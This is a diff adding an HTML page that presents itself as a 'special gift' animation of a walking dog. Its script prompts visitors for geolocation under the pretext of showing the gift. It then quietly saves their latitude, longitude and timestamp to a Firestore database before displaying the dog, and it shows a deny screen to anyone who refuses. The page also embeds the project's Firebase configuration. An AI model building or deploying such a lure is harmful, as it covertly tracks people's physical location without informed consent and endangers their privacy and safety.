@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Walking Dog | EL Creative Academy</title>
+<link rel="stylesheet" type="text/css" href="style.css">
+</head>
+
+<body>
+
+<!-- POPUP -->
+<div id="welcomePopup" class="popup">
+    <div class="popup-card">
+        <h1>shiva's🎁 Special Gift For You</h1>
+        <p>Please allow to see the gift.</p>
+        <button id="allowBtn">Show Gift</button>
+    </div>
+</div>
+
+<div id="denyScreen" class="deny-screen">
+    Please allow permission to see Cliffy
+</div>
+
+<!-- DOG -->
+<div class="dog">
+    <div class="torso">
+        <div class="fur">
+            <div class="spot"></div>
+        </div>
+
+        <div class="neck">
+            <div class="fur"></div>
+
+            <div class="head">
+                <div class="fur">
+                    <div class="snout"></div>
+                </div>
+
+                <div class="ears">
+                    <div class="ear"><div class="fur"></div></div>
+                    <div class="ear"><div class="fur"></div></div>
+                </div>
+
+                <div class="eye"></div>
+            </div>
+
+            <div class="collar"></div>
+        </div>
+
+        <div class="legs">
+            <div class="leg"><div class="fur"><div class="leg-inner"><div class="fur"></div></div></div></div>
+            <div class="leg"><div class="fur"><div class="leg-inner"><div class="fur"></div></div></div></div>
+            <div class="leg"><div class="fur"><div class="leg-inner"><div class="fur"></div></div></div></div>
+            <div class="leg"><div class="fur"><div class="leg-inner"><div class="fur"></div></div></div></div>
+        </div>
+
+        <div class="tail">
+            <div class="tail">
+                <div class="tail">
+                    <div class="tail">
+                        <div class="tail"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </div>
+</div>
+
+<script type="module">
+
+/* ---------------- FIREBASE ---------------- */
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import { getFirestore, addDoc, collection } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+const firebaseConfig = {
+    apiKey: "AIzaSyA7azpHY6KGuZESPvcKkqZRsieYUxEKQOw",
+    authDomain: "cliffy-fabfa.firebaseapp.com",
+    projectId: "cliffy-fabfa",
+    storageBucket: "cliffy-fabfa.firebasestorage.app",
+    messagingSenderId: "958614534649",
+    appId: "1:958614534649:web:545bf6ccff8f66606b2528",
+    measurementId: "G-NWWP6B3NKF"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+/* ---------------- UI ---------------- */
+const dog = document.querySelector(".dog");
+const popup = document.getElementById("welcomePopup");
+const allowBtn = document.getElementById("allowBtn");
+const denyScreen = document.getElementById("denyScreen");
+
+dog.style.display = "none";
+
+/* ---------------- MOVEMENT STATE ---------------- */
+let targetX = window.innerWidth / 2;
+let targetY = window.innerHeight / 2;
+
+let currentX = targetX;
+let currentY = targetY;
+
+let lastMoveTime = Date.now();
+
+/* ---------------- PERMISSION FLOW ---------------- */
+allowBtn.addEventListener("click", () => {
+
+navigator.geolocation.getCurrentPosition(
+
+async (position) => {
+
+const lat = position.coords.latitude;
+const lng = position.coords.longitude;
+
+/* SAVE TO FIRESTORE */
+await addDoc(collection(db, "locations"), {
+lat,
+lng,
+timestamp: Date.now()
+});
+
+popup.style.display = "none";
+dog.style.display = "flex";
+
+startDog();
+
+},
+
+(error) => {
+console.log(error);
+popup.style.display = "none";
+denyScreen.style.display = "flex";
+}
+);
+
+});
+
+/* ---------------- DOG ENGINE ---------------- */
+function startDog() {
+
+dog.classList.add("walking");
+
+function moveDog(x, y) {
+targetX = x;
+targetY = y;
+lastMoveTime = Date.now();
+
+dog.classList.remove("sitting");
+dog.classList.add("walking");
+}
+
+/* EVENTS */
+document.addEventListener("mousemove", (e) => {
+moveDog(e.clientX, e.clientY);
+});
+
+document.addEventListener("touchmove", (e) => {
+const t = e.touches[0];
+moveDog(t.clientX, t.clientY);
+});
+
+document.addEventListener("click", (e) => {
+moveDog(e.clientX, e.clientY);
+});
+
+/* ANIMATION LOOP */
+function animateDog() {
+
+currentX += (targetX - currentX) * 0.025;
+currentY += (targetY - currentY) * 0.025;
+
+dog.style.left = `${currentX - 150}px`;
+dog.style.top = `${currentY - 150}px`;
+
+const idleTime = Date.now() - lastMoveTime;
+
+if (idleTime > 2000) {
+dog.classList.add("sitting");
+dog.classList.remove("walking");
+}
+
+requestAnimationFrame(animateDog);
+}
+
+animateDog();
+}
+
+</script>
+
+</body>
+</html>
